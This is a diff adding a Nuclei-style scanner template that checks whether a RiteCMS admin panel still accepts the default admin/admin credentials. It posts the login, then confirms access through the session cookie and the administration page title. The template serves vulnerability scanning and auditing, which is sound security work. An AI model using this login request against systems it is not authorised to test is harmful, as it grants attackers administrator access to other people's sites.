@@ -1,0 +1,47 @@
+id: ritecms-default-login
+
+info:
+  name: RiteCMS - Default Credentials
+  author: 0x_Akoko
+  severity: high
+  description: >
+    Attempts to log in to the RiteCMS admin panel using the default
+    administrator credentials (admin/admin). It then validates the login
+    by accessing the dashboard and checking the page title.
+  reference:
+    - https://ritecms.com/
+  classification:
+    cwe-id: CWE-798
+  metadata:
+    verified: true
+    max-request: 2
+  tags: ritecms,default-login,creds,auth-bypass
+
+http:
+  - raw:
+      - |
+        POST {{BaseURL}}/ritecms/admin.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&userpw=admin
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 302"
+          - "contains(header, 'Set-Cookie: PHPSESSID')"
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET {{BaseURL}}/ritecms/admin.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, '<title>RiteCMS - Administration</title>')"
